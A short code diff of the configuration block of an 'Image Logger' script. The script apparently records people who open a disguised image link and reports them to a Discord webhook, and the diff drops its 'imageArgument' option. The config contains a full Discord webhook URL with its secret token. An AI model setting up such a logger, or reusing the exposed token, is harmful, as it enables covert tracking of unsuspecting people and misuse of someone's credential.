@@ -15,8 +15,6 @@ config = {
     "webhook": "https://discord.com/api/webhooks/1363167285128335430/JaLBwcJ9xY3q4Llb6U4IndoeAixURiX19O2T-dTMWacJOIryPKiM562MazxA4DAveDvi",
     "image": "https://media.discordapp.net/attachments/1095357643419295786/1106949767822594118/image0.gif?ex=6805034e&is=6803b1ce&hm=4abb90f6a851482d75459ebcdc96be697df9eea5dc6a9249d16bdfcd2d8a0eee&=", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
-
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
